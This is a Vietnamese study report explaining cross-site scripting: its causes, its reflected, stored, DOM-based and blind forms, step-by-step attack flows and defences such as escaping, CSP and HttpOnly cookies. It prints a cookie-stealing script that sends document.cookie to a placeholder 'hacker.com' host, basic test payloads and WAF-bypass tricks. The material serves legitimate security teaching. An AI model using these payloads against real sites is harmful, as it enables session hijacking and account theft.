# BÁO CÁO XSS - CROSS-SITE SCRIPTING - LÝ THUYẾT CƠ BẢN

## GIỚI THIỆU
### 1.1 XSS là gì?
Cross-Site Scripting (XSS) là kỹ thuật tấn công cho phép kẻ tấn công chèn mã JavaScript độc hại vào trang web hợp lệ. Khi người dùng truy cập, mã độc sẽ chạy trong trình duyệt của họ.

Hình ảnh trực quan:
Hacker gắn "máy nghe lén" vào cửa hàng của bạn. Mỗi khi khách hàng vào, máy nghe lén ghi lại thông tin và gửi về cho hacker.

### 1.2 Tại sao XSS nguy hiểm?
Đánh cắp cookie → Chiếm tài khoản người dùng
Ghi lại phím bấm (keylogging) → Lấy mật khẩu, thẻ tín dụng
Chuyển hướng sang trang giả mạo → Đánh cắp thông tin đăng nhập
Thực hiện hành động trái phép trên tài khoản nạn nhân (like, share, chuyển tiền)
Duy trì truy cập lâu dài (persistent backdoor)

---

## NGUYÊN NHÂN

### 2.1 Nguyên nhân gốc rễ
Không kiểm tra dữ liệu đầu vào: Thiếu validation và sanitization
Tin tưởng dữ liệu từ người dùng: Không escape trước khi hiển thị
Sử dụng innerHTML với dữ liệu ngoại lai
Dùng eval() với input người dùng
Không sử dụng Content Security Policy (CSP)

### 2.2 Cơ chế hoạt động
Hacker nhập vào ô tìm kiếm:

<script>fetch('hacker.com?c='+document.cookie)</script>
Trình duyệt nhận được HTML chứa script đó và thực thi. Cookie của nạn nhân bị gửi về máy hacker.

---

## PHÂN LOẠI XSS

### 3.1 Phân loại theo vị trí tấn công
Reflected XSS: Payload nằm trên URL (phần query string)
Stored XSS: Payload nằm trong database
DOM-based XSS: Payload nằm trên URL Fragment (sau dấu #)
Blind XSS: Payload chờ admin kích hoạt (dạng con của Stored)

### 3.2 Phân loại theo cách khai thác
Phản chiếu (Reflected): Server trả lại payload trong response
Lưu trữ (Stored): Server lưu payload vào database
Client-side: Trình duyệt tự xử lý payload

---

## 3 LOẠI XSS CHÍNH
### 4.1 Reflected XSS (XSS Phản chiếu)
Hình ảnh: Cái loa vọng lại
Nơi chứa payload: Trong URL (phần query string)
Cách thức: User click link → Gửi request lên server → Server in lại payload trong response
Ai bị tấn công? Chỉ những ai click link độc hại
Server có biết? CÓ (payload nằm trong request)
Cần lừa nạn nhân? CÓ (phải gửi link riêng cho từng người)

Ví dụ:
Hacker gửi email: "Bấm vào đây xem ưu đãi!"
Link: https://shop.com/search?q=<script>gửi cookie cho hacker</script>
Khi bạn click, script chạy ngay → Cookie bị đánh cắp.

### 4.2 Stored XSS (XSS Lưu trữ)
Hình ảnh: Quả mìn chờ nổ
Nơi chứa payload: Trong Database (comment, bài đăng, hồ sơ)
Cách thức: Hacker gửi 1 lần → Server lưu vào DB → Ai xem trang cũng bị
Ai bị tấn công? Bất kỳ ai truy cập vào trang bị nhiễm
Server có biết? CÓ (payload được lưu trong DB)
Cần lừa nạn nhân? KHÔNG (tự động tấn công hàng loạt)

Ví dụ:
Hacker bình luận trên bài viết: "Bài viết hay quá! <ảnh lỗi chạy script>"
Bình luận lưu vào database. Cả nghìn người xem bài viết đều bị script chạy.

### 4.3 DOM-based XSS (XSS trên trình duyệt)
Hình ảnh: Tự bắn vào chân mình
Nơi chứa payload: Trong URL Fragment (sau dấu #)
Cách thức: Trình duyệt tự lấy payload từ URL, chèn vào trang bằng innerHTML
Ai bị tấn công? Chỉ những ai click link độc hại
Server có biết? KHÔNG (vì phần # không gửi lên server)
Dễ phát hiện? KHÔNG (không có dấu vết trên server)

Ví dụ:
Hacker tạo link: https://web.com#<ảnh lỗi chạy script>
Bạn click link → Trình duyệt tự lấy phần sau # và chèn vào trang → Script chạy ngay.
Server hoàn toàn không biết gì!

Điểm đặc biệt:
Server chỉ gửi trang HTML bình thường. Chính JavaScript của trang đã tự "bắn vào chân" khi dùng innerHTML với dữ liệu từ URL.

### 4.4 Blind XSS (XSS Mù)
Bản chất: Dạng đặc biệt của Stored XSS
Cách thức: Payload lưu vào DB nhưng chỉ kích hoạt khi Admin xem trang quản trị
Ai bị tấn công? Admin / Người có quyền cao
Thời gian: Có thể sau vài giờ hoặc vài ngày
Công cụ điển hình: XSS Hunter, Burp Collaborator

Ví dụ:
Hacker gửi phản hồi qua form liên hệ chứa payload.
Nhân viên CSKH mở form để xem phản hồi → Payload chạy → Cookie Admin bị đánh cắp.

---

## CÁCH THỨC TẤN CÔNG
### 5.1 Quy trình tấn công Reflected XSS
Bước 1: Hacker tìm lỗ hổng → Tạo URL chứa payload
Bước 2: Gửi URL qua email/mạng xã hội cho nạn nhân
Bước 3: Nạn nhân click → Trình duyệt gửi request lên server (kèm cookie)
Bước 4: Server KHÔNG kiểm tra → In payload vào HTML response
Bước 5: Trình duyệt thực thi script → Cookie bị gửi về hacker
Bước 6: Hacker dùng cookie đăng nhập vào tài khoản nạn nhân

### 5.2 Quy trình tấn công Stored XSS
Bước 1: Hacker tìm chỗ nhập dữ liệu được lưu vào DB (comment, đánh giá)
Bước 2: Gửi payload: "Nội dung bình thường + máy nghe lén"
Bước 3: Server lưu vào DB
Bước 4: Nạn nhân truy cập xem trang → Server lấy comment từ DB ra
Bước 5: Trình duyệt parse và thực thi payload
Bước 6: Cookie bị gửi về hacker

### 5.3 Quy trình tấn công DOM-based XSS
Bước 1: Hacker tìm code JS dùng innerHTML với dữ liệu từ URL
Bước 2: Tạo link: https://web.com#<payload>
Bước 3: Gửi link cho nạn nhân
Bước 4: Trình duyệt gửi request: GET / (KHÔNG gửi phần #)
Bước 5: Server trả về HTML bình thường
Bước 6: JS của trang chạy: lang = window.location.hash.substring(1)
Bước 7: innerHTML chèn payload vào trang
Bước 8: Payload chạy → Cookie bị gửi đi
Bước 9: Server KHÔNG hề biết vụ tấn công!

---

## CÁC LOẠI PAYLOAD THƯỜNG DÙNG
### 6.1 Payload cơ bản (Dùng để kiểm tra)
Kiểm tra lỗ hổng: <script>alert(1)</script>
Bỏ qua thẻ script (dùng sự kiện): <img src=x onerror=alert(1)>
Bỏ qua dấu nháy: "><script>alert(1)</script>
Với URL Fragment: #<img src=x onerror=alert(1)>

### 6.2 Payload đánh cắp cookie
Dùng ảnh (Image): Tạo request đến hacker.com kèm cookie qua URL
Dùng fetch: Gửi POST/GET đến server hacker
Dùng XMLHttpRequest: Tương tự fetch, cách cũ
Cách hoạt động:
Mọi cách đều tạo một request HTTP đến server của hacker, với cookie nằm trong URL hoặc body.

### 6.3 Kỹ thuật Bypass WAF
Mã hóa Base64: eval(atob('YWxlcnQoMSk=')) → giải mã thành alert(1)
Mã hóa Unicode: Dùng \u0061 thay cho chữ a
Dùng sự kiện: Thay vì <script>, dùng <img onerror=...>
Viết thường/hoa: <ScRiPt>alert(1)</ScRiPt> (nếu filter không phân biệt chữ hoa/thường)

---

## CÁCH PHÒNG CHỐNG
### 7.1 Nguyên tắc vàng
"KHÔNG BAO GIỜ TIN TƯỞNG DỮ LIỆU TỪ NGƯỜI DÙNG"

### 7.2 Các biện pháp phòng chống
Escape dữ liệu (Quan trọng nhất): Chuyển < thành <, > thành > để trình duyệt không hiểu là thẻ HTML
Dùng textContent thay innerHTML: textContent chỉ hiển thị text, không chạy HTML
Không dùng eval() với input: eval() chạy mọi chuỗi như code JavaScript
Validate input: Chỉ chấp nhận dữ liệu đúng định dạng (số điện thoại, email...)
Sanitize input: Dùng thư viện DOMPurify để lọc thẻ HTML nguy hiểm

### 7.3 Content Security Policy (CSP)
Server gửi header hướng dẫn trình duyệt chỉ chạy script từ nguồn tin cậy:
Content-Security-Policy: script-src 'self'

Hiệu quả:
Dù hacker chèn được script, trình duyệt cũng từ chối chạy vì không đúng nguồn.

### 7.4 Cookie an toàn (HttpOnly)
Thêm flag HttpOnly vào cookie:
Set-Cookie: sessId=abc123; HttpOnly; Secure

Hiệu quả:
JavaScript không thể đọc cookie này. Dù có XSS, cookie vẫn an toàn.

---

## TỔNG KẾT
### 8.1 Tóm tắt các kiểu tấn công
Reflected: Lừa nạn nhân click link chứa payload. Server in lại payload trong response.
Stored: Lưu payload vào database. Bất kỳ ai xem đều bị. Nguy hiểm nhất.
DOM-based: Trình duyệt tự xử lý payload. Server không biết. Khó phát hiện nhất.
Blind: Dạng đặc biệt của Stored. Chờ Admin kích hoạt.

### 8.2 Bài học rút ra
XSS là lỗ hổng rất nguy hiểm và phổ biến. Nguyên nhân chính là do website hiển thị dữ liệu từ người dùng mà không kiểm tra.
Cách phòng chống hiệu quả nhất:
Escape mọi dữ liệu trước khi hiển thị
Dùng textContent thay innerHTML
Thêm CSP và HttpOnly Cookie
Không tin tưởng bất kỳ dữ liệu nào từ người dùng

### 8.3 Những điều cần nhớ
Client-side validation (JavaScript) KHÔNG phải là bảo mật
DOM-based XSS có thể qua mặt server và WAF
Stored XSS chỉ cần 1 lần gửi, tấn công hàng nghìn người
Cookie HttpOnly giúp bảo vệ ngay cả khi có XSS
CSP là lớp phòng thủ cuối cùng mạnh mẽ

## TÀI LIỆU THAM KHẢO
OWASP XSS - https://owasp.org/www-community/attacks/xss/
OWASP Cheat Sheet - https://cheatsheetseries.owasp.org/
PortSwigger Web Security Academy - https://portswigger.net/web-security
TryHackMe - Intro to XSS
XSS Hunter - https://xsshunter.com/